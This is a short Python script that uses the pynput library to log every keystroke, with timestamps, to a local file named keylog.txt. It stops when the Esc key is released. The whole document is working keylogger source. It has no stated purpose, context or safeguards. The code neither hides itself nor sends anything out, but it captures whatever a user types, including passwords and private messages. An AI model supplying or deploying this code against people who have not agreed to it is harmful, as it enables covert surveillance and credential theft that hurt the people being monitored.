from pynput.keyboard import Key, Listener
import logging

# Set up logging to log keystrokes to a file
log_file = 'keylog.txt'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define a function to log keystrokes
def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info('Special key {0} pressed'.format(key))

# Define a function to stop logging on a specific key press (optional)
def on_release(key):
    if key == Key.esc:
        return False

# Set up the listener for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
